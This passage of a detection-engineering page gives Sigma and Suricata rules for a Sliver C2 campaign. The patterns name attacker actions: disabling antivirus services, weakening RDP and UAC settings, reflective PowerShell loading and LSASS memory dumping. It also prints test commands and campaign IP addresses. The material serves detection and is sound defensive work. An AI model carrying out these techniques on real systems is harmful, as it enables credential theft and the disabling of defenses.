  analyst correlation this single-event rule cannot perform.
references:
    - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
author: The Hunters Ledger
date: '2026-09-06'
modified: '2026-10-11'
tags:
    - attack.stealth
    - attack.defense-impairment
    - attack.persistence
    - attack.t1112
    - attack.privilege-escalation
    - attack.t1548.002
logsource:
    category: registry_set
    product: windows
    definition: 'Requires Sysmon Event ID 13 (RegistryEvent SetValue) or Security Event ID 4657 with value auditing enabled for the listed keys.'
detection:
    sel_rdp_enable:
        TargetObject|endswith: '\Terminal Server\fDenyTSConnections'
        Details:
            - 'DWORD (0x00000000)'
            - 0
    sel_nla_disable:
        TargetObject|endswith: '\WinStations\RDP-Tcp\UserAuthentication'
        Details:
            - 'DWORD (0x00000000)'
            - 0
    sel_tokenfilter:
        TargetObject|endswith: '\Policies\System\LocalAccountTokenFilterPolicy'
        Details:
            - 'DWORD (0x00000001)'
            - 1
    sel_uac_disable:
        TargetObject|endswith: '\Policies\System\EnableLUA'
        Details:
            - 'DWORD (0x00000000)'
            - 0
    condition: 1 of sel_*
falsepositives:
    - Deliberate server provisioning or hardening review touching one or more of these values
level: medium
```

#### Named Endpoint Protection Service Start Type Set To Disabled

**Tier:** Hunting
**Robustness:** 1
**ATT&CK Coverage:** T1685 (Disable or Modify Tools)
**ATT&CK Note:** ATT&CK v19.2 revoked and restructured T1562 (Impair Defenses): T1562.001 was promoted to this top-level technique under a new Defense Impairment tactic rather than staying a Defense Evasion sub-technique, which is why this rule tags `attack.defense-impairment` and `attack.t1685` below, not the retired ID.
**Confidence:** MODERATE
**Rationale:** Rewritten 2026-10-11. The earlier version selected every Service Control Manager event 7036 or 7040 with no service name and no state, so it matched every service start, stop and start-type change on every host and could not carry the "set of endpoint-protection service names" or "listed services" its text claimed. This version keys on the eight short service names that the campaign script `task_39.ps1` stops and disables (`ekrn`, `EraAgentSvc`, `EhttpSrv`, `EESvc`, `eguiSvc`, `epfw`, `epfwwfp`, `eamonm`, from the analysis notes; the product they belong to is not named here), and on the registry write that makes the disabled state persistent: the service's `Start` value set to 4 under `HKLM\System\<ControlSet>\Services\<name>`. It reads the registry because the Service Control Manager events report a service's display name, which the analysis notes do not record, while the registry key is named by the short service name the script used. It does not cover the stop half of the script: a service stopped but not disabled is not matched. Eight such writes within minutes is the campaign pattern; the per-event rule cannot count them, so one hit is a lead and several on one host in a short window is the signal.
**False Positives:** The product's own installer, upgrade or uninstall setting one of these services to disabled, and an administrator deliberately disabling the product's services. Each write is individually ordinary during maintenance; only several of the eight together on one host within minutes resemble the campaign, and this rule does not count them.
**Blind Spots:** Misses a different AV/EDR product's service names entirely, a stop without a disable, and a start-type change that Sysmon does not log (no registry monitoring of the Services hive). It does not count or time the burst.
**Validation:** On a test host, create a service named one of the eight (for example `sc create ekrn binPath= C:\Windows\System32\cmd.exe`) and run `sc config ekrn start= disabled`, which must match once Sysmon logs the `Start` write. Setting the `Start` value of any other service to 4, or setting a listed service's `Start` to any value other than 4, must NOT fire. No live Sysmon event was replayed (NOT CHECKED); the decimal form of the value is accepted for the Elastic pipeline per the registry value rendering note under "RDP, UAC Or Token-Filter Registry Value Weakened".
**Deployment:** Sysmon-fed SIEM with Event ID 13 registry monitoring that covers `HKLM\System\CurrentControlSet\Services`. Analyst should check for several of the eight names on the same host within a short window before escalating.

```yaml
title: Named Endpoint Protection Service Start Type Set To Disabled
id: 657adc6d-37b1-481d-8ff5-c13278c9c359
status: experimental
description: >-
  Detects the Start value of one of eight named endpoint-protection services being set to 4
  (disabled) under HKLM\System\<ControlSet>\Services, the service names that this campaign's
  task_39.ps1 stops and disables. Individually common during legitimate maintenance; several
  of the eight on one host within a short window is the actual campaign signature and needs
  analyst correlation this single-event rule cannot perform.
references:
    - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
author: The Hunters Ledger
date: '2026-09-06'
modified: '2026-10-11'
tags:
    - attack.defense-impairment
    - attack.t1685
    - stp.2
logsource:
    category: registry_set
    product: windows
    definition: 'Requires Sysmon Event ID 13 (RegistryEvent SetValue) with registry monitoring that covers HKLM\System\CurrentControlSet\Services. The rule reads the Sysmon fields TargetObject and Details (DWORD rendered as DWORD (0x00000004)); other registry sources such as Security Event ID 4657 name their fields differently and this page declares no mapping for them.'
detection:
    selection_service:
        TargetObject|startswith: 'HKLM\System\'
        TargetObject|endswith:
            - '\Services\ekrn\Start'
            - '\Services\EraAgentSvc\Start'
            - '\Services\EhttpSrv\Start'
            - '\Services\EESvc\Start'
            - '\Services\eguiSvc\Start'
            - '\Services\epfw\Start'
            - '\Services\epfwwfp\Start'
            - '\Services\eamonm\Start'
    selection_disabled:
        Details:
            - 'DWORD (0x00000004)'
            - 4
    condition: selection_service and selection_disabled
falsepositives:
    - The endpoint product's own installer, upgrade or uninstall setting its services to disabled
    - An administrator deliberately disabling the product's services during maintenance
level: medium
```

#### Curl Fetch Of A Node.js Zip Or tar.exe Command Line Under LOCALAPPDATA

**Tier:** Hunting
**Robustness:** 1
**ATT&CK Coverage:** T1105 (Ingress Tool Transfer)
**Confidence:** MODERATE
**False Positives:** A developer's workstation or a build server legitimately fetching Node.js this same way is a real and common pattern; this rule cannot itself tell a developer host from a victim workstation, which is why it is Hunting rather than Detection. The tar branch matches any `tar.exe` whose command line contains `\AppData\Local\`, whatever it extracts, because it carries no reference to Node.js.
**Blind Spots:** Misses delivery of the Node.js runtime by any other mechanism (a bundled installer, a different package manager). The two branches are ORed and are not correlated: neither the order, the same host, a time window nor the presence or absence of a development toolchain is tested.
**Validation:** Trigger by running `curl.exe` against `nodejs.org/dist/*.zip`, or `tar.exe` with a command line containing the expanded `\AppData\Local\` path (the rule tests the command line as logged after environment expansion, so a literal `%LOCALAPPDATA%` in the logged text does not match); either one alone fires, whether or not the other ran. The curl branch tests the two substrings `nodejs.org/dist` and `.zip` anywhere in the command line, not the URL host, so `curl.exe https://example.org/nodejs.org/dist/a.zip` fires as well. There is no benign negative in the rule: a developer host doing either is matched, and the rule itself does not distinguish.
**Deployment:** Endpoint EDR / Sysmon-fed SIEM. Analyst should check whether the host has any other legitimate development purpose before escalating.

```yaml
title: Curl Fetch Of A Node.js Zip Or tar.exe Command Line Under LOCALAPPDATA
id: 32c19bc3-e8a6-430c-bb8b-b75943b93488
status: experimental
description: >-
  Detects either of two independent events: curl.exe whose command line contains both
  nodejs.org/dist and .zip (the substrings are not bound to the URL host), or tar.exe run
  with a command line containing \AppData\Local\. Together
  they are the bring-your-own-runtime bootstrap this campaign's Node.js bot uses to obtain a
  signed, legitimate node.exe, but the two selections are ORed: no order, same-host or time
  relationship is tested, the tar branch has no reference to Node.js, and nothing tests
  whether the host has a development toolchain.
references:
    - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
author: The Hunters Ledger
date: '2026-09-06'
tags:
    - attack.command-and-control
    - attack.t1105
logsource:
    category: process_creation
    product: windows
    definition: 'Requires process creation logging that populates CommandLine, for example Sysmon EID 1 or Security EID 4688 with command line auditing enabled.'
detection:
    selection_curl:
        Image|endswith: '\curl.exe'
        CommandLine|contains|all:
            - 'nodejs.org/dist'
            - '.zip'
    selection_tar:
        Image|endswith: '\tar.exe'
        CommandLine|contains: '\AppData\Local\'
    condition: selection_curl or selection_tar
falsepositives:
    - A developer workstation or build server legitimately provisioning Node.js this same way
level: low
```

#### PowerShell Script Block Containing Reflection.Assembly Load And FromBase64String

**Tier:** Hunting
**Robustness:** 1
**ATT&CK Coverage:** T1620 (Reflective Code Loading), T1027 (Obfuscated Files or Information)
**Confidence:** LOW
**False Positives:** Widely used by legitimate PowerShell modules and administrative tooling that reflectively load .NET assemblies for entirely benign reasons; this is one of the broadest LOLBin-adjacent patterns available and needs analyst review of the decoded payload before any escalation.
**Blind Spots:** Misses reflective loading performed via any other primitive (`Add-Type`, direct `[Reflection.Assembly]::LoadFile`, or a compiled loader that never touches script-block logging at all).
**Validation:** Trigger by running a PowerShell one-liner that calls `[System.Reflection.Assembly]::Load(` against the output of `[Convert]::FromBase64String(`. A benign case that must NOT fire: any PowerShell script block that does not combine these two specific calls.
**Deployment:** PowerShell Script Block Logging (Event ID 4104) forwarded to SIEM.

```yaml
title: PowerShell Script Block Containing Reflection.Assembly Load And FromBase64String
id: 5024b26b-169d-4ef8-8016-ca502a557d1b
status: experimental
description: >-
  Detects a PowerShell script block that contains both [System.Reflection.Assembly]::Load(
  and FromBase64String, the combination of a reflective in-memory load with a Base64-decoded
  byte array that this campaign uses for shellcode injection staging. The two strings are
  tested independently within the script block; the rule does not test that the decoded
  bytes are the argument to Load. Broadly used by legitimate tooling as well, so this is a
  scoping signal rather than a high-confidence alert.
references:
    - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
author: The Hunters Ledger
date: '2026-09-06'
tags:
    - attack.stealth
    - attack.t1620
    - attack.t1027
logsource:
    category: ps_script
    product: windows
    definition: 'Requires PowerShell Script Block Logging (Event ID 4104) enabled.'
detection:
    selection:
        ScriptBlockText|contains|all:
            - '[System.Reflection.Assembly]::Load('
            - 'FromBase64String'
    condition: selection
falsepositives:
    - Legitimate PowerShell modules and administrative tooling that reflectively load .NET assemblies from an embedded Base64 payload
level: low
```

#### LSASS Memory Access With A Dump-Capable Access Mask

**Tier:** Hunting
**Robustness:** 2
**ATT&CK Coverage:** T1003.001 (LSASS Memory)
**Confidence:** MODERATE
**Rationale:** *Round 2, 2026-10-10:* re-tiered from Detection to Hunting and the mask list corrected. The page's own false-positive line admits endpoint security products and diagnostic tools open LSASS with these masks, and the selection has no `SourceImage`, signer or vendor exclusion, so the rule cannot separate them from a dumper without local baselining. The list also held `0x1400` (`PROCESS_QUERY_INFORMATION` plus `PROCESS_QUERY_LIMITED_INFORMATION`, no `PROCESS_VM_READ`), which cannot read memory; it was removed so every remaining mask includes `PROCESS_VM_READ` (`0x0010`). The companion report establishes an `lsass` minidump capability (`MiniDumpWriteDump` to `C:\Windows\Temp\ls.dmp`, report line 245), not the specific mask the script's handle is granted, so the list is a set of common dump-capable masks, not an observed one.
**False Positives:** Endpoint security products and some legitimate diagnostic tools (Task Manager's "Create dump file", ProcDump run deliberately by an administrator) open LSASS with a broad access mask; baselining against known-good process names in the environment is expected.
**Blind Spots:** Misses a technique that reads LSASS memory through a driver or an indirect handle duplication from another process that already holds a handle, rather than opening it directly.
**Validation:** Trigger by opening a handle to `lsass.exe` from an unsigned or unexpected process with an access mask that Sysmon reports as one of the exact `GrantedAccess` values in the selection (for example `0x1410`). The rule compares the granted mask for equality against that list, so a requested mask of `PROCESS_VM_READ | PROCESS_QUERY_INFORMATION` (`0x0410`) does not fire unless the granted value reported by Sysmon is in the list; confirm the reported mask before treating a miss as a rule failure. There is no benign negative in the rule: Windows Defender or an EDR agent's own LSASS scan with one of these masks also fires, and is handled by a local `SourceImage` exclusion or baseline, not by this rule.
**Deployment:** Endpoint EDR with Sysmon Event ID 10 (process access) enabled.

```yaml
title: Process Access To LSASS With A Dump-Capable Access Mask
id: 504bf8d9-074c-497f-ac16-05da396b8637
status: experimental
description: >-
  Detects a process opening a handle to lsass.exe with an access mask consistent with
  memory dumping (every listed mask includes PROCESS_VM_READ), the LSASS credential-access route used
  alongside mimikatz and SAM/SYSTEM/SECURITY hive theft in this campaign.
references:
    - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
author: The Hunters Ledger
date: '2026-09-06'
modified: '2026-10-10'
tags:
    - attack.credential-access
    - attack.t1003.001
    - stp.3
logsource:
    category: process_access
    product: windows
    definition: 'Requires Sysmon Event ID 10 (ProcessAccess) enabled and not filtered for lsass.exe as a target.'
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess:
            - '0x1010'
            - '0x1038'
            - '0x1410'
            - '0x1438'
            - '0x143a'
            - '0x1fffff'
    condition: selection
falsepositives:
    - Endpoint security or diagnostic tooling deliberately dumping LSASS for legitimate incident-response or troubleshooting purposes
level: medium
```

---

## Suricata Signatures

### Detection Rules

**Sliver**

#### HTTP POST To A Minified-Static-Asset-Shaped Path With A Single-Letter Query Parameter

**Tier:** Detection
**Robustness:** 3
**ATT&CK Coverage:** T1071.001 (Web Protocols), T1132.001 (Standard Encoding)
**Confidence:** HIGH
**False Positives:** None known. A real minified JavaScript or PHP static asset is fetched with `GET`, never `POST`; the method mismatch alone is the anomaly, and the single-letter query parameter (`z=`, `j=`, `w=`, `o=`, `f=`, `s=`, `e=`, `v=`, `b=`) on top of it is not a pattern real web asset requests use.
**Blind Spots:** Would miss a rebuild that switches the beacon check-in to `GET` requests, or one that drops the query parameter entirely. Requires cleartext HTTP visibility; if the operator moves this decoy traffic behind TLS, this specific rule needs a TLS-capable equivalent (out of scope here since the current beacon runs this pattern over plain HTTP on port 80).
**Validation:** Trigger by sending a `POST` to a path such as `/bundles/scripts/script/app.min.php?z=1234` or `/script/bundles/scripts?o=1234`. A benign case that must NOT fire: a `GET` request for a real `.js`/`.php` static asset, or a `POST` to an API endpoint that does not shape its path like a minified asset.
**Deployment:** Network IDS at the network egress point (Suricata sensor).

```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"THL DETECT Sliver-C2-WinPostEx-193-233-202-17 POST To Minified-Asset-Shaped Path With Single-Letter Query Parameter (C2 Beacon Check-in)"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"="; pcre:"/^\/(?:script|scripts|bundle|bundles|javascript|javascripts|route|array)(?:\/[a-z]+){0,3}(?:\.(?:min\.js|min\.php|js|php))?\?[a-z]=[A-Za-z0-9]+$/"; threshold:type limit,track by_src,count 1,seconds 60; reference:url,the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/; classtype:trojan-activity; sid:9301901; rev:2; metadata:author The_Hunters_Ledger, date 2026-09-06;)
```

#### HTTP Client Claims A Non-Existent Chrome 108 Build

**Tier:** Detection
**Robustness:** 3
**ATT&CK Coverage:** T1071.001 (Web Protocols)
**Confidence:** HIGH
**False Positives:** None known. `Chrome/108.0.6602.492` is internally impossible: real Chrome 108 stable builds are versioned `108.0.5359.x`, so no genuine Chrome installation, of any version, ever sends this exact string.
**Blind Spots:** Fires only while the operator keeps this specific hardcoded value; a rebuild with a different (even if still fabricated) UA string needs a new rule. Requires cleartext HTTP or a TLS-terminating inspection point to see the User-Agent header.
**Validation:** Trigger by sending any HTTP request carrying `User-Agent: ...Chrome/108.0.6602.492...`. A benign case that must NOT fire: any request carrying a real, internally consistent Chrome User-Agent string.
**Deployment:** Network IDS at the network egress point (Suricata sensor).

```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"THL DETECT Sliver-C2-WinPostEx-193-233-202-17 HTTP Client Claims Non-Existent Chrome 108 Build (Beacon User-Agent)"; flow:established,to_server; http.user_agent; content:"Chrome/108.0.6602.492"; reference:url,the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/; classtype:trojan-activity; sid:9301902; rev:2; metadata:author The_Hunters_Ledger, date 2026-09-06;)
```

---

## Coverage Gaps

**The 60-second, zero-jitter beacon interval, the single most rotation-resistant signal this campaign produced, is not represented as a rule, and that is a deliberate gap, not an oversight.** It was measured across eleven consecutive intervals in this campaign's own detonation and is genuinely the most rotation-resistant signal in the case. Suricata and Sigma are both line-oriented, per-event matchers; neither has a keyword that measures the variance of inter-connection timing across a sequence of past flows from the same source. Expressing this rule honestly needs flow-timing analytics (a Zeek-plus-RITA-style beacon score, or an equivalent UEBA/NDR capability that windows and statistically scores connection cadence), which sits outside what a single Suricata signature or Sigma selection can encode without either being syntactically fictitious or silently degrading into a much weaker proxy. The same limitation applies to the "paired connections to ports 80 and 443 on the same destination within one second" pattern observed in this campaign: correlating two separate flows to the same destination within a tight window is a network-analytics query, not a single-rule match. Both are recorded here as genuine capability gaps; a defender running flow-based beacon analytics against egress traffic is the correct tool for this anchor, not an IDS signature.

**The fallback-ladder tradecraft behind the `77.110.126.46` hunt request is the same capability gap in a different shape.** The genuinely non-atomic form of that behavior is not "connect to this IP", it is a sequence: a failed connect attempt to the primary tier, a failed connect attempt to the secondary tier with a 10-second connect timeout, then an attempt to the fallback tier, repeating on a 30-second retry when all three fail. That sequence is what would survive the operator swapping in a fourth tier at a new address, and it is exactly as unrepresentable in a single Suricata or Sigma selector as the zero-jitter beacon above, for the same reason: it requires correlating the outcome of several distinct connection attempts across a time window, which is a flow-timing analytics question, not a per-event match. A defender running the same beacon/fallback-timing analytics recommended for anchor 1 is the correct tool for this behavior too; no rule, atomic or otherwise, captures the ladder itself.

**The raw TCP fallback to `77.110.126.46:51264-51266`, the campaign's third fallback tier, is deliberately Cut from rule-authoring, not written as a Suricata rule.** Applying the `detection-rule-tiering` skill's own routing test: remove the single hardcoded IP and the rule detects connections to three ports on any host anywhere, which is meaningless. That makes it a pure IP-match atomic under the skill's own Suricata bucket definition ("pure IP-match rules → reputation/dataset, not a signature"), and it is already correctly captured, with full context and the mandatory `HUNT ONLY, NEVER BLOCK` classification, in `threat-intel-vault/ioc-feeds/sliver-c2-windows-postex-staging-193-233-202-17-iocs.json` under `hunt_only_never_block`. A `flowbits`-chained sequence rule (set a bit on a failed connection to the primary tier, another on a failed connection to the secondary tier, alert only when both are set and a connection to the fallback tier follows) was considered and rejected: it would still key fundamentally on the same three hardcoded IPs with no non-atomic anchor, at the cost of three coupled rules instead of one feed entry, so the feed entry is the correct home for this indicator.

**The five-domain naming convention ("two concatenated English words, no hyphen, `.com`") is real hunting signal but is not expressible as a Suricata or Sigma selector.** Matching it correctly requires a dictionary-backed check (is this string decomposable into two common English words with no separator) that neither a `content`/`pcre` match nor a Sigma field selector can perform; a wordlist-driven analytic query against newly observed domains is the right tool, not a rule in this file.

**`146.103.127.44` is historical-only (April 2026) and explicitly MONITOR, not BLOCK**, per the IOC feed; no rule is authored against it here for the same atomic-routing reason as the fallback IP above, and because the address has since been reassigned to an unrelated occupant.

**Two Sliver-family behavioral indicators are acknowledged but not separately ruled on**, because the detonation-derived counts underlying them (~23 threads at startup, zero file/registry writes while awaiting tasking) describe an *absence* of activity over a time window, which a single Sysmon-backed Sigma selection cannot assert without a correlation window across multiple event types that this file does not attempt to build; a genuine EDR-native "process created N threads then produced no file/registry events for T minutes" correlation rule is a plausible future addition if that telemetry shape is available to a deploying reader.

**No rule was written for `Add-DnsServerResourceRecordA` planting a record into an AD-integrated DNS zone.** The behavior is real and documented (`webtitan_whitelist.ps1` and the `add_dns_from_37.ps1`-class scripts), but it needs non-default DNS Server audit logging (Microsoft-Windows-DNS-Server/Analytical or Audit 770) that very few environments enable, and a Sigma rule against telemetry this rare would carry more false confidence than value; noted here as a genuine gap rather than authored against unlikely-to-exist logs.

**Chisel and Ligolo-ng usage is not ruled on at all, per the campaign's own do-not-rule-on list.** A command-line pattern for Chisel's `client ... R:socks` reverse-SOCKS invocation was considered; it was rejected because it identifies use of the stock tool rather than this operator, which is exactly the class of rule `stage1-summary.json`'s `do_not_rule_on` block rules out.

**The exact Sliver version and the numeric beacon interval/jitter values in the serialized protobuf configuration remain unrecovered** (per `stage1-summary.json` `analysis_gaps`), so no rule keys on either; the 60-second interval used above as a documented fact came from network observation, not from parsing the configuration structure itself.

**Two file hashes served by the current EtherRAT C2 (`0019dfc4b3...`, `d465172175d3...`) are uncharacterized**; no rule is authored against them since their content and function are unknown.

---

## License
Detection rules are licensed under **Creative Commons Attribution 4.0 International (CC BY 4.0)**.
Free to use, including commercially, with attribution to The Hunters Ledger.
